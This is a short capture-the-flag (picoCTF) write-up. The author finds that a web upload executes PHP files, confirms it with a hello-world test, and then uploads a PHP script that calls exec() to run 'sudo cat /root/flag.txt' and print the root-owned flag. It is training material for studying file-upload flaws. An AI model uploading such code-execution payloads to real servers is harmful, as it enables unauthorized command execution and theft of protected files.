The clue tells us the file isn't being parsed, and from doing past picoCTF problems I had a suspicion it was written in PHP. I uploaded a helloworld.php file which had `<?php echo "Hello World!";?>` and confirmed my suspicion: the file isnt being santized and I can inject PHP code into it.

A simple PHP script to execute shell commands will do:
```php
<?php
	$output=null;
	$retvall=null;
	exec("sudo cat /root/flag.txt", $output, $retvall);
	print_r($output);
?>
```
